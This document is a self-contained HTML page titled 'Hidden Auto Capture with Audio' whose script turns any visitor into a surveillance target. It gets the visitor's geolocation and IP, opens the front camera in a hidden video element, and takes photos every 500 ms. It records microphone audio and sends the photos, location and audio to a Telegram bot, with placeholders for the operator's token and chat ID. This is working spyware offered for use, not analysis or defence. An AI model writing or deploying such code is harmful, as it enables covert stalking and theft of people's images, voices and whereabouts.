<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Hidden Auto Capture with Audio</title>
</head>
<body>

<script>
  const botToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your bot token
  const chatId = 'YOUR_CHAT_ID';              // Replace with your chat ID
  const captureInterval = 500;                // Photo capture every 500 ms
  let captureLoop;
  let stream;
  let mediaRecorder;
  let audioChunks = [];
  let locationData = 'Location unavailable';
  let ipData = 'IP unavailable';

  async function start() {
    try {
      // Get location
      try {
        const location = await getLocation();
        locationData = `Lat: ${location.lat}, Lon: ${location.lon}`;
      } catch (e) {
        console.error('Location error:', e);
      }

      // Get IP
      try {
        const ip = await fetch('https://api.ipify.org?format=json')
          .then(response => response.json());
        ipData = `IP: ${ip.ip}`;
      } catch (e) {
        console.error('IP fetch error:', e);
      }

      // Start camera + microphone
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
      const video = document.createElement('video');
      video.style.display = 'none';
      document.body.appendChild(video);
      video.srcObject = stream;
      await video.play();

      // Start camera photo capture loop
      captureLoop = setInterval(() => captureAndSend(video), captureInterval);

      // Start recording audio
      mediaRecorder = new MediaRecorder(stream);
      mediaRecorder.ondataavailable = event => {
        if (event.data.size > 0) {
          audioChunks.push(event.data);
        }
      };
      mediaRecorder.start(); // Start recording audio

    } catch (error) {
      console.error('Setup error:', error);
      stopAll();
    }
  }

  async function captureAndSend(video) {
    try {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
      const caption = `${locationData}\n${ipData}\n${new Date().toLocaleString()}`;

      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob);
      formData.append('caption', caption);

      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData,
      });

    } catch (error) {
      console.error('Capture/send error:', error);
      stopAll();
    }
  }

  async function sendAudio() {
    if (!audioChunks.length) return;
    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('voice', audioBlob);
    formData.append('caption', `${locationData}\n${ipData}\nFull Audio Recording`);

    try {
      // navigator.sendBeacon doesn't support multipart/form-data, so we use fetch sync on unload
      await fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
        method: 'POST',
        body: formData,
        keepalive: true // Keeps connection open during unload
      });
    } catch (error) {
      console.error('Audio send error:', error);
    }
  }

  function stopAll() {
    if (captureLoop) clearInterval(captureLoop);
    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
      mediaRecorder.stop();
    }
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }
  }

  function getLocation() {
    return new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(
        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
        reject
      );
    });
  }

  // Handle page close
  window.addEventListener('beforeunload', async (event) => {
    stopAll();
    await sendAudio();
  });

  // Start when permissions granted
  start();
</script>

</body>
</html>
